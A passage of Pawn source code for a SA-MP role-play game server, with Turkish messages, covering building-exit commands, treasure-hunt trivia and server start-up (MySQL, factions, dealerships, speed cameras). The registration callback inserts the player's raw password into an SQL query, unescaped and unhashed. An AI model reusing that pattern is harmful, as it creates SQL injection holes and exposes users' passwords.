				PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
			}
		}
	}
    return 1;
}

CMD:cik(playerid, params[])
{
    if(GetPVarInt(playerid, "PBM") > 0) {
        SendClientMessage(playerid, COLOR_WHITE, "Arenadayken bunu yapamazsýn!");
        return 1;
    }
    if(PlayerInfo[playerid][pJailed] > 0)
	{
        SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");
        return 1;
    }
	new string[128];

    for(new i = 0; i <  sizeof(DDoorsInfo); i++) {
        if(IsPlayerInRangeOfPoint(playerid,3,DDoorsInfo[i][ddInteriorX], DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddInteriorVW])
		{
			format(string, sizeof(string), "* %s binadan dýþarý çýktý.", GetPlayerNameEx(playerid));
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerInterior(playerid,DDoorsInfo[i][ddExteriorInt]);
            PlayerInfo[playerid][pInt] = DDoorsInfo[i][ddExteriorInt];
            SetPlayerVirtualWorld(playerid, DDoorsInfo[i][ddExteriorVW]);
            PlayerInfo[playerid][pVW] = DDoorsInfo[i][ddExteriorVW];
            if(DDoorsInfo[i][ddCustomExterior]) {
				LoadObjectsForPlayer(playerid);
            }
            if(DDoorsInfo[i][ddVehicleAble] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
                SetVehiclePos(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorX],DDoorsInfo[i][ddExteriorY],DDoorsInfo[i][ddExteriorZ]);
                SetVehicleZAngle(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorA]);
                SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorVW]);
                LinkVehicleToInterior(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorInt]);
            }
            else {
                SetPlayerPos(playerid,DDoorsInfo[i][ddExteriorX],DDoorsInfo[i][ddExteriorY],DDoorsInfo[i][ddExteriorZ]);
                SetPlayerFacingAngle(playerid, DDoorsInfo[i][ddExteriorA]);
                SetCameraBehindPlayer(playerid);
            }
            return Streamer_UpdateEx(playerid, DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
        }
    }
    for(new i = 0; i <  sizeof(HouseInfo); i++) {
        if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hInteriorX], HouseInfo[i][hInteriorY], HouseInfo[i][hInteriorZ]) && (GetPlayerVirtualWorld(playerid) == i+60000))
		{
			format(string, sizeof(string), "* %s evden dýþarý çýktý.", GetPlayerNameEx(playerid));
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPlayerInterior(playerid,0);
            PlayerInfo[playerid][pInt] = 0;
            if(HouseInfo[i][hCustomExterior])
			{
                LoadObjectsForPlayer(playerid);
            }
            SetPlayerPos(playerid,HouseInfo[i][hExteriorX],HouseInfo[i][hExteriorY],HouseInfo[i][hExteriorZ]);
            SetPlayerFacingAngle(playerid, HouseInfo[i][hExteriorR]);
            SetCameraBehindPlayer(playerid);
            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            return Streamer_UpdateEx(playerid, HouseInfo[i][hExteriorX],HouseInfo[i][hExteriorY],HouseInfo[i][hExteriorZ]);
        }
    }
	#pragma tabsize 0
    if(IsPlayerInRangeOfPoint(playerid, 2, -27.3025,-57.6649,1003.5469) || IsPlayerInRangeOfPoint(playerid, 2, 207.0638,-139.9965,1003.5078) || IsPlayerInRangeOfPoint(playerid, 2, 285.8044,-85.9956,1001.5229) || IsPlayerInRangeOfPoint(playerid, 2, 493.4252,-24.3061,1000.6797) || IsPlayerInRangeOfPoint(playerid, 2, 834.1631,7.4883,1004.1797) || IsPlayerInRangeOfPoint(playerid, 2, 372.3830,-133.2579,1001.4922) // 24/7 || Clothes Shop || Ammunation || Club || Advertisement Agency || FastFood
    || IsPlayerInRangeOfPoint(playerid, 2, 1003.9112,52.2134,55.3221))
	{
	    new idx;
		idx = GetPlayerVirtualWorld(playerid)-100;
		/*if(!done && idx < MAX_BIZ && BizInfo[idx][bType])
		{*/
		format(string, sizeof(string), "* %s kapýyý açar ve dükkandan ayrýlýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        SetPlayerPos(playerid, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]);
	        SetPlayerInterior(playerid, 0);
	        SetPlayerVirtualWorld(playerid, 0);
        /*}*/
//        done = 1;
	}
	
    // Hitman HQ
    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1277.019165, -758.428771, 5080.750000) && (GetPlayerVirtualWorld(playerid) == 666420))
	{
        if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
		{
            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            SetPlayerInterior(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerPos(playerid, 1938.545898, 165.629531, 37.281250);
            SetPlayerFacingAngle(playerid, 338.54);
            SetCameraBehindPlayer(playerid);
        }
    }

    // The Lubu Gentlemen's Club
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, -1077.946533, 613.206665, 1116.507812) && (GetPlayerVirtualWorld(playerid) == 373737))
	{
		format(string, sizeof(string), "* %s binadan dýþarý çýktý.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

		SetPlayerVirtualWorld(playerid, 0);
   		PlayerInfo[playerid][pVW] = 0;
     	SetPlayerInterior(playerid, 0);
      	PlayerInfo[playerid][pInt] = 0;
      	SetPlayerPos(playerid, 511.817230, -1510.971679, 14.566996);
       	SetPlayerFacingAngle(playerid, 272.11);
       	SetCameraBehindPlayer(playerid);

       	StopAudioStreamForPlayer(playerid);
    }

    // The Tableau Club
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, 308.045654, 1053.886840, 1098.540039) && (GetPlayerVirtualWorld(playerid) == 363636))
	{
		format(string, sizeof(string), "* %s binadan dýþarý çýktý.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

		SetPlayerVirtualWorld(playerid, 0);
   		PlayerInfo[playerid][pVW] = 0;
     	SetPlayerInterior(playerid, 0);
      	PlayerInfo[playerid][pInt] = 0;
      	SetPlayerPos(playerid, 561.802795, -1506.722412, 14.548986);
       	SetPlayerFacingAngle(playerid, 86.78);
       	SetCameraBehindPlayer(playerid);

       	StopAudioStreamForPlayer(playerid);
    }
    // The Tableau Club (VIP ROOM)
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, 293.066436, 1029.785278, 1104.560058) && (GetPlayerVirtualWorld(playerid) == 363636))
	{
 		SetPlayerVirtualWorld(playerid, 363636);
   		PlayerInfo[playerid][pVW] = 363636;
     	SetPlayerInterior(playerid, 36);
      	PlayerInfo[playerid][pInt] = 36;
      	SetPlayerPos(playerid, 307.904296, 1025.602294, 1098.540039);
       	SetPlayerFacingAngle(playerid, 264.06);
       	SetCameraBehindPlayer(playerid);
    }
    // Santa Maria Surfer's Lounge
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, 271.742034, 1074.419677, 5096.750000) && (GetPlayerVirtualWorld(playerid) == 353535))
	{
		format(string, sizeof(string), "* %s binadan dýþarý çýktý.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

		SetPlayerVirtualWorld(playerid, 0);
   		PlayerInfo[playerid][pVW] = 0;
     	SetPlayerInterior(playerid, 0);
      	PlayerInfo[playerid][pInt] = 0;
      	SetPlayerPos(playerid, 387.958374, -1870.688110, 7.835937);
       	SetPlayerFacingAngle(playerid, 89.99);
       	SetCameraBehindPlayer(playerid);

       	StopAudioStreamForPlayer(playerid);
    }
    // Shamal
    else if(InsideShamal[playerid] != INVALID_VEHICLE_ID && IsPlayerInRangeOfPoint(playerid,3,2.509036, 23.118730, 1199.593750))
	{
        format(string, sizeof(string), "* %s, Shamal model uçaktan dýþarý çýktý.", GetPlayerNameEx(playerid));
        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

        if(InsideShamal[playerid] == INVALID_VEHICLE_ID || GetVehicleModel(InsideShamal[playerid]) != 519) {
            PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
            GivePlayerValidWeapon(playerid, 46, 60000);
            SetPlayerPos(playerid, 0.000000, 0.000000, 420.000000);
        }
        else {
            new Float:X, Float:Y, Float:Z;
            GetVehiclePos(InsideShamal[playerid], X, Y, Z);
            SetPlayerPos(playerid, X-4, Y-2.3, Z);

            new Float:XB, Float:YB, Float:ZB;
            GetVehiclePos(InsideShamal[playerid], XB, YB, ZB);
            if(ZB > 50.0) {
                PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
                GivePlayerValidWeapon(playerid, 46, 60000);
            }
        }

        PlayerInfo[playerid][pVW] = 0;
        SetPlayerVirtualWorld(playerid, 0);
        PlayerInfo[playerid][pInt] = 0;
        SetPlayerInterior(playerid, 0);
        InsideShamal[playerid] = INVALID_VEHICLE_ID;
    }
    return 1;
}

main()
{
	print("\n----------------------------------");
	print("Phoenix Role Play");
	print("----------------------------------\n");
}

forward OnPlayerStatsUpdate(playerid);
public OnPlayerStatsUpdate(playerid) {
	#pragma unused playerid
	return 1;
}

forward OnPlayerLogin(playerid,password[]);
public OnPlayerLogin(playerid,password[]) {
	#pragma unused playerid
	#pragma unused password
	return 1;
}

forward OnPlayerOfflineLogin(playername[]);
public OnPlayerOfflineLogin(playername[]) {
	#pragma unused playername
}

forward OnPlayerOfflineSave(playername[]);
public OnPlayerOfflineSave(playername[]) {
	#pragma unused playername
	return 1;
}

forward OnPlayerRegister(playerid, password[]);
public OnPlayerRegister(playerid, password[]) {
	if(IsPlayerConnected(playerid)) {
		new
		    szPlayerName[MAX_PLAYER_NAME],
		    szPlayerName2[MAX_PLAYER_NAME],
		    szQuery[225];

		GetPlayerName(playerid, szPlayerName, MAX_PLAYER_NAME);

		mysql_real_escape_string(szPlayerName, szPlayerName2, g_MySQLConnections[0]);

		SetPVarString(playerid, "password", password);

		// Set the variable to logged in so we aren't cockblocked by SaveAccount()
		gPlayerLogged[playerid] = 1;

		format(szQuery, sizeof(szQuery), "INSERT INTO players (Username, Password) VALUES('%s', '%s')", szPlayerName2, password);
		mysql_query(szQuery, THREAD_REGISTER_ACCOUNT, playerid, g_MySQLConnections[0]);
		PlayerInfo[playerid][pLevel] = 1;

	}
	return 1;
}

stock AntiDeAMX()
{
    new a[][] = {
        "Unarmed (Fist)",
        "Brass K"
    };
    #pragma unused a
}

#if defined TREASURE_HUNT_ENABLED
stock SetRandomHuntPos() {
	iHuntLocation = random(sizeof(fTreasureHuntLS));

	DestroyPickup(iHuntPickup);
	DestroyDynamic3DTextLabel(lHunt);
	iHuntPickup = CreatePickup(1279, 1, fTreasureHuntLS[iHuntLocation][0], fTreasureHuntLS[iHuntLocation][1], fTreasureHuntLS[iHuntLocation][2], 0);
	lHunt = CreateDynamic3DTextLabel("Hediyebulma Etkinliði\nGiris yapin", COLOR_YELLOW, fTreasureHuntLS[iHuntLocation][0], fTreasureHuntLS[iHuntLocation][1], fTreasureHuntLS[iHuntLocation][2]+0.5, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
	return 1;
}

stock PrizeMenu(playerid) {
	ShowPlayerDialogEx(playerid, DIALOG_HUNT_PRIZE, DIALOG_STYLE_LIST, "Hediyebulma Ödül Seçeneði", "20 pot, 10 crack\n2,000 materyal\nDesert Eagle\n1 saygi puani\n", "Tamam", "Iptal");
	return 1;
}

stock AskHuntQuestion(playerid) {
	if(!IsPlayerConnected(playerid))
	    return 0;

	SetPVarInt(playerid, "HuntQ", random(10));

	SendClientMessage(playerid, COLOR_WHITE, "To unlock the prize, you must answer a question. If you get the answer wrong, the treasure will be moved before you have a chance to try again.");
	switch(GetPVarInt(playerid, "HuntQ")) {
	    case 0: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What was the date the server opened? (EU/US timezone)", "January 6th\nJanuary 3rd\nJanuary 5th\nJanuary 8th", "Tamam", "Iptal");
	    case 1: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What is Jay Chawla's favourite catchphrase?", "Game on\nPlug in\nMastication for the Nation\nMatch on\n", "Tamam", "Iptal");
	    case 2: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "Do you know a man named Miles Thorson?", "Yes, we're good friends\nHe kicked my dog\nNo, He's an imaginary character from The Mentalist\n", "Tamam", "Iptal");
	    case 3: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "When was the theoretical physicist Albert Einstein born?", "December 25th, 2011\nMarch 14th, 1879\nApril 18th, 1955\nJanuary 4th, 1804", "Tamam", "Iptal");
	    case 4: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What is the 'sizeof' function in Pawn?", "A stock function\nA forwarded function\nA macro which gets the size of a string\nThe name of a cereal", "Tamam", "Iptal");
	    case 5: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What is the callsign of the Campo's team in Battlefield 3?", "Kimball 4-6\nMisfit 1-3\nFitmissie 69\nActual 1-3", "Tamam", "Iptal");
	    case 6: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "In the popular US TV show 'Psych', what is the name of the sidekick?", "Burton Guster\nCarlton Lassiter\nJames Roday\nHenry Spencer", "Tamam", "Iptal");
	    case 7: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "Which company developed the iPhone?", "Grapefruit\nOrange\nApple\nBlackBerry", "Tamam", "Iptal");
	    case 8: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What symbol is used for hashtags on Twitter?", "#\n$\nï¿½\n&", "Tamam", "Iptal");
	    case 9: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "3 robbers robbed a store. Once they came out, they were totally changed, but they still continued robbing. Why?", "Developers, developers, developers, developers (cont.)\nThey changed their clothes, not their ways\nThey used Harry Potter's cloak of invisibility\nThe sun is shining everyday", "Tamam", "Iptal");
	}

	return 1;
}
#endif

public OnGameModeInit()
{
     // /Cuenta
	CuentaLogo = TextDrawCreate(556.000000, 133.000000, "KARAKTER PANELI");
	TextDrawAlignment(CuentaLogo, 2);
	TextDrawBackgroundColor(CuentaLogo, 60);
	TextDrawFont(CuentaLogo, 1);
	TextDrawLetterSize(CuentaLogo, 0.260000, 1.000000);
	TextDrawColor(CuentaLogo, -1);
	TextDrawSetOutline(CuentaLogo, 1);
	TextDrawSetProportional(CuentaLogo, 1);
	TextDrawUseBox(CuentaLogo, 1);
	TextDrawBoxColor(CuentaLogo, 1027489704);
	TextDrawTextSize(CuentaLogo, 0.000000, 111.000000);
	TextDrawSetSelectable(CuentaLogo, 0);
	textdrawscount++;

	CuentaBox = TextDrawCreate(556.000000, 148.000000, "_");
	TextDrawAlignment(CuentaBox, 2);
	TextDrawBackgroundColor(CuentaBox, 255);
	TextDrawFont(CuentaBox, 1);
	TextDrawLetterSize(CuentaBox, 0.260000, 8.900002);
	TextDrawColor(CuentaBox, -1);
	TextDrawSetOutline(CuentaBox, 0);
	TextDrawSetProportional(CuentaBox, 1);
	TextDrawSetShadow(CuentaBox, 1);
	TextDrawUseBox(CuentaBox, 1);
	TextDrawBoxColor(CuentaBox, 120);
	TextDrawTextSize(CuentaBox, 0.000000, 111.000000);
	TextDrawSetSelectable(CuentaBox, 0);
	textdrawscount++;

	CuentaGeneral = TextDrawCreate(555.000000, 152.000000, "GENEL");
	TextDrawAlignment(CuentaGeneral, 2);
	TextDrawBackgroundColor(CuentaGeneral, 255);
	TextDrawFont(CuentaGeneral, 3);
	TextDrawLetterSize(CuentaGeneral, 0.450000, 1.000000);
	TextDrawColor(CuentaGeneral, -1);
	TextDrawSetOutline(CuentaGeneral, 1);
	TextDrawSetProportional(CuentaGeneral, 1);
	TextDrawUseBox(CuentaGeneral, 1);
	TextDrawBoxColor(CuentaGeneral, 0);
	TextDrawTextSize(CuentaGeneral, 12.000000, 61.000000);
	TextDrawSetSelectable(CuentaGeneral, 1);
	textdrawscount++;

	CuentaInmuebles = TextDrawCreate(555.000000, 173.000000, "OZELLIKLER");
	TextDrawAlignment(CuentaInmuebles, 2);
	TextDrawBackgroundColor(CuentaInmuebles, 255);
	TextDrawFont(CuentaInmuebles, 3);
	TextDrawLetterSize(CuentaInmuebles, 0.500000, 1.000000);
	TextDrawColor(CuentaInmuebles, -1);
	TextDrawSetOutline(CuentaInmuebles, 1);
	TextDrawSetProportional(CuentaInmuebles, 1);
	TextDrawUseBox(CuentaInmuebles, 1);
	TextDrawBoxColor(CuentaInmuebles, 0);
	TextDrawTextSize(CuentaInmuebles, 12.000000, 51.000000);
	TextDrawSetSelectable(CuentaInmuebles, 1);
	textdrawscount++;

	CuentaAutos = TextDrawCreate(555.000000, 195.000000, "ARACLAR");
	TextDrawAlignment(CuentaAutos, 2);
	TextDrawBackgroundColor(CuentaAutos, 255);
	TextDrawFont(CuentaAutos, 3);
	TextDrawLetterSize(CuentaAutos, 0.500000, 1.000000);
	TextDrawColor(CuentaAutos, -1);
	TextDrawSetOutline(CuentaAutos, 1);
	TextDrawSetProportional(CuentaAutos, 1);
	TextDrawUseBox(CuentaAutos, 1);
	TextDrawBoxColor(CuentaAutos, 0);
	TextDrawTextSize(CuentaAutos, 12.000000, 51.000000);
	TextDrawSetSelectable(CuentaAutos, 1);
	textdrawscount++;

	CuentaInventario = TextDrawCreate(557.000000, 215.000000, "ENVANTER");
	TextDrawAlignment(CuentaInventario, 2);
	TextDrawBackgroundColor(CuentaInventario, 255);
	TextDrawFont(CuentaInventario, 3);
	TextDrawLetterSize(CuentaInventario, 0.500000, 1.000000);
	TextDrawColor(CuentaInventario, -1);
	TextDrawSetOutline(CuentaInventario, 1);
	TextDrawSetProportional(CuentaInventario, 1);
	TextDrawUseBox(CuentaInventario, 1);
	TextDrawBoxColor(CuentaInventario, 0);
	TextDrawTextSize(CuentaInventario, 12.000000, 75.000000);
	TextDrawSetSelectable(CuentaInventario, 1);
	textdrawscount++;

	CuentaCerrar = TextDrawCreate(608.000000, 133.000000, "X");
	TextDrawAlignment(CuentaCerrar, 2);
	TextDrawBackgroundColor(CuentaCerrar, 255);
	TextDrawFont(CuentaCerrar, 1);
	TextDrawLetterSize(CuentaCerrar, 0.260000, 1.000000);
	TextDrawColor(CuentaCerrar, -1);
	TextDrawSetOutline(CuentaCerrar, 0);
	TextDrawSetProportional(CuentaCerrar, 1);
	TextDrawSetShadow(CuentaCerrar, 1);
	TextDrawUseBox(CuentaCerrar, 1);
	TextDrawBoxColor(CuentaCerrar, 1027489704);
	TextDrawTextSize(CuentaCerrar, 20.000000, 6.000000);
	TextDrawSetSelectable(CuentaCerrar, 1);
	textdrawscount++;
    new
		string[42],
		time[3];

    #if defined TREASURE_HUNT_ENABLED
    	SetRandomHuntPos();
    #endif

	AntiDeAMX();
	Streamer_TickRate(125);

	SetGameModeText("P:RP " SERVER_VERSION);

	ManualVehicleEngineAndLights();
	EnableStuntBonusForAll(0);
	DisableInteriorEnterExits();
	SetNameTagDrawDistance(45.0);
	AllowInteriorWeapons(1);
	SetWeather(2);
	LoadGates();
	SkinList = LoadModelSelectionMenu("SkinList.txt");

	//------------------------------------------------------------------------------------------------------------
	// MySQL
	//------------------------------------------------------------------------------------------------------------

	if(!IsBETAServer()) {
		g_MySQLConnections[0] = mysql_connect(SQL_HOST, SQL_USER, SQL_DB, SQL_PASS);
	} else
	g_MySQLConnections[0] = mysql_connect(SQL_HOST, SQL_USER, SQL_DB, SQL_PASS);
	if(mysql_ping() == 1)
	{
		mysql_debug(0);// SQL Log - 0: Off / 1: On
		printf("[MySQL]: `%s` Veritabanina baglanti kuruldu, sunucu aciliyor.", SQL_DB);
	}
	else
	{
		printf("[MySQL-HATA]: `%s` Veritabanina baglanti kurulamadi, Sunucu kapatiliyor.", SQL_DB);
		SendRconCommand("exit");
		return 0;
	}
	mysql_debug(0);

	mysql_query("set session query_cache_type=0;", THREAD_NO_RESULT, 0, g_MySQLConnections[0]);

	// Dynamic systems
	LoadPoints();
	LoadFamilies();
	LoadHouses();
	LoadBiz();
	LoadDynamicDoors();
	LoadDynamicMapIcons();
	LoadcDealerships();
	Misc_Load();

	for(new f = 0; f < sizeof(FamilyInfo); f++)
	{
		for(new fv = 0; fv < MAX_GANG_VEHICLES; fv++)
		{
		    FamilyVehicleInfo[f][fv][fvModelId] = 0;
			FamilyVehicleInfo[f][fv][fvSpawnx] = 0.0;
			FamilyVehicleInfo[f][fv][fvSpawny] = 0.0;
			FamilyVehicleInfo[f][fv][fvSpawnz] = 0.0;
			FamilyVehicleInfo[f][fv][fvSpawna] = 0.0;
			FamilyVehicleInfo[f][fv][fvPaintJob] = -1;
			FamilyVehicleInfo[f][fv][fvColor1] = 126;
			FamilyVehicleInfo[f][fv][fvColor2] = 126;
			FamilyVehicleInfo[f][fv][fvPrice] = 0;
			FamilyVehicleInfo[f][fv][fvFuel] = 100.00;
	    	FamilyVehicleInfo[f][fv][fvId] = INVALID_VEHICLE_ID;
		}
	}

	LoadFamiliesHQ();
	ClearReports();

	for(new h = 0; h < sizeof(FamilyInfo); h++)
	{
		if(FamilyInfo[h][FamilyUSafe] > 0)
		{
			FamilyInfo[h][FamilyPickup] = CreatePickup(1239, 23, FamilyInfo[h][FamilySafe][0], FamilyInfo[h][FamilySafe][1], FamilyInfo[h][FamilySafe][2], -1);
		}
		if(FamilyInfo[h][FamilyEntrance][0] != 0.0 && FamilyInfo[h][FamilyEntrance][1] != 0.0)
		{
		    FamilyInfo[h][FamilyEntrancePickup] = CreatePickup(1318, 23, FamilyInfo[h][FamilyEntrance][0], FamilyInfo[h][FamilyEntrance][1], FamilyInfo[h][FamilyEntrance][2], -1);
			format(string, sizeof(string), "%s", FamilyInfo[h][FamilyName]);
			FamilyInfo[h][FamilyEntranceText] = CreateDynamic3DTextLabel(string,COLOR_YELLOW,FamilyInfo[h][FamilyEntrance][0], FamilyInfo[h][FamilyEntrance][1], FamilyInfo[h][FamilyEntrance][2]+0.6,4.0);
		}
		LoadGangVehicles(h);
	}

	for(new h = 0; h < sizeof(Points); h++)
	{
		if(Points[h][Type] == 3)
		{
			format(string, sizeof(string), " ALINABILIR POT: %d gram.", Points[h][Stock]);
			Points[h][TextLabel] = CreateDynamic3DTextLabel(string, COLOR_YELLOW, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz], 4.0);
			Points[h][CratePoint] = 1;
		}
		else if(Points[h][Type] == 4)
		{
			format(string, sizeof(string), " ALINABILIR CRACK: %d gram.", Points[h][Stock]);
			Points[h][TextLabel] = CreateDynamic3DTextLabel(string, COLOR_YELLOW, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz], 4.0);
			Points[h][CratePoint] = 2;
		}
		CreatePickup(1239, 23, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz], -1);
	}

	new text_info[128];
	for(new d = 0; d < sizeof(CarDealershipInfo); d++)
	{
		if(CarDealershipInfo[d][cdEntranceX] != 0.0 && CarDealershipInfo[d][cdEntranceY] != 0.0)
		{
			CarDealershipInfo[d][cdPickupID] = CreatePickup(1272, 1, CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ], -1);
			if(CarDealershipInfo[d][cdOwned])
			{
	            format(text_info, sizeof(text_info),"%s arac bayisi\nSahibi: %s\nID: %d", CarDealershipInfo[d][cdMessage], CarDealershipInfo[d][cdOwner], d);
	            CarDealershipInfo[d][cdTextLabel] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]+0.5,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
			}
			else
			{
	            format(text_info, sizeof(text_info),"% arac bayisi satilik\nUcret: %d\nID: %d", CarDealershipInfo[d][cdMessage], CarDealershipInfo[d][cdPrice], d);
	            CarDealershipInfo[d][cdTextLabel] = CreateDynamic3DTextLabel(text_info,COLOR_YELLOW,CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]+0.5,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
			}
		}
		for(new v = 0; v < MAX_DEALERSHIPVEHICLES; v++)
	    {
			if(CarDealershipInfo[d][cdVehicleModel][v] != 0)
			{
		        new carcreated = CreateVehicle(CarDealershipInfo[d][cdVehicleModel][v], CarDealershipInfo[d][cdVehicleSpawnX][v], CarDealershipInfo[d][cdVehicleSpawnY][v], CarDealershipInfo[d][cdVehicleSpawnZ][v], CarDealershipInfo[d][cdVehicleSpawnAngle][v], 0, 0, 6);
		        format(text_info, sizeof(text_info), "%s Satilik | Ucret: %d", GetVehicleName(carcreated), CarDealershipInfo[d][cdVehicleCost][v]);
                CarDealershipInfo[d][cdVehicleLabel][v] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,0.0, 0.0, 0.0,8.0,INVALID_PLAYER_ID,carcreated);
                CarDealershipInfo[d][cdVehicleId][v] = carcreated;
			}
		}
	}

	gettime(time[0], time[1], time[2]);
	FixHour(time[0]);
	PSeconds = 1;
	PMinutes = time[1];
	PHours = time[0];
	time[0] = shifthour;
	ghour = shifthour;
	SetWorldTime(ghour);

	for(new i=0;i<MAX_VEHICLES;i++)
	{
	    Fuel[i] = 100;
 	}

	for(new i = 0; i <= sizeof(Peds)-1; i++)
	{
		AddPlayerClass(Peds[i][0],1958.3783,1343.1572,1100.3746,269.1425,-1,-1,-1,-1,-1,-1);
	}
	for(new i = 0; i < sizeof(CreatedCars); i++)
	{
		CreatedCars[i] = INVALID_VEHICLE_ID;
	}


	SetTimer("FotoMultaON", 100, 1);
    CrearFotoMulta(1637.54602, -1599.41687, 12.36710,0.00000, 0.00000, 90.00000,40,80);
    CrearFotoMulta(1873.12988, -1746.79468, 12.37010,0.00000, 0.00000, -90.77110,40,80);
    CrearFotoMulta(2118.88110, -1592.14697, 24.67230,0.00000, 0.00000, 180.00000,40,80);
    CrearFotoMulta(1982.53381, -1471.66492, 12.55140,0.00000, 0.00000, 90.00000,40,80);
    CrearFotoMulta(2258.77954, -1653.40576, 14.23620,0.00000, 0.00000, -100.05760,40,80);
    CrearFotoMulta(1955.81580, -1808.65405, 12.37010,0.00000, 0.00000, 0.00000,40,80);
    CrearFotoMulta(1350.49121, -1338.13904, 12.36365,0.00000, 0.00000, 0.00000,40,80);
    CrearFotoMulta(1305.26929, -1586.55811, 12.37257,0.00000, 0.00000, 0.00000,40,80);
    CrearFotoMulta(1089.27600, -1412.97119, 12.63350,0.00000, 0.00000, 90.00000,40,80);
    CrearFotoMulta(965.12299, -1775.15234, 13.09490,0.00000, 0.00000, -104.45780,40,80);
    CrearFotoMulta(1491.94409, -1878.23950, 12.36570,0.00000, 0.00000, 95.34310,40,80);// hýz limiti.

    Foto = TextDrawCreate(-20.000000,2.000000,"|");
	TextDrawUseBox(Foto,1);
	TextDrawBoxColor(Foto,0xFFFFFF69);
	TextDrawTextSize(Foto,660.000000,22.000000);
	TextDrawAlignment(Foto,0);
	TextDrawBackgroundColor(Foto,0xFFFFFF69);
	TextDrawFont(Foto,3);
	TextDrawLetterSize(Foto,1.000000,52.200000);
	TextDrawColor(Foto,0xFFFFFF69);
	TextDrawSetOutline(Foto,1);
	TextDrawSetProportional(Foto,1);
	TextDrawSetShadow(Foto,1);
	SetTimer("RandomMessage",5000,1);
	
	
	//LSPD Button
	lspdcopsonly = CreateButton(244.90686035156, 72.328125, 1003.9609375, 3.0); // ONLYS ONLY
	lspdeveryone = CreateButton(244.92, 73.42, 1004.27, 92.0); // People, ^^==LSPD

	CreateDynamicObject(2886, 244.90686035156, 72.328125, 1003.9609375,0,0,3.0, 20002); //lspdcopsonly button
	CreateDynamicObject(2886, 244.92, 73.42, 1004.27,0,0,92.0, 20002); //lspdeveryone button

	lspddoor1 = CreateDynamicObject(1569, 246.35150146484,72.547714233398,1002.640625, 0.000000, 0.000000, 0.000000);
	lspddoor2 = CreateDynamicObject(1569, 245.03300476074,72.568511962891,1002.640625, 0.000000, 0.000000, 0.000000);
	
	// Yeni LSPD
